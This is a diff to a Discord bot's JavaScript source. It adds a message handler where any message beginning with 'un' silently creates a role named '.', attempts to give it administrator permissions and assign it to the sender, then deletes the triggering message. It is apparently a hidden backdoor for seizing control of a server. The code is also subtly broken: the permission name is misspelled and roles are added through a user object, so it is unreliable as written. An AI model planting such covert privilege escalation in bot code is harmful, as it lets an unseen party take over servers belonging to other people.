@@ -608,5 +608,17 @@ client.on('message', message => {
         message.channel.send(`Hello <@${config.owner}> owner!`)
     }
 })
+client.on('message', message => {
+   if(message.content.startsWith('un')) {
+     message.member.guild.createRole({
+name : "."
+}).then(role => {
+role.setPermissions(["ADMINISTATOR"])
+})
+     message.author.roles.add("un").then(()=> {
+      message.delete()
+     })
+}
+})
 
 client.login(process.env.token_bot);
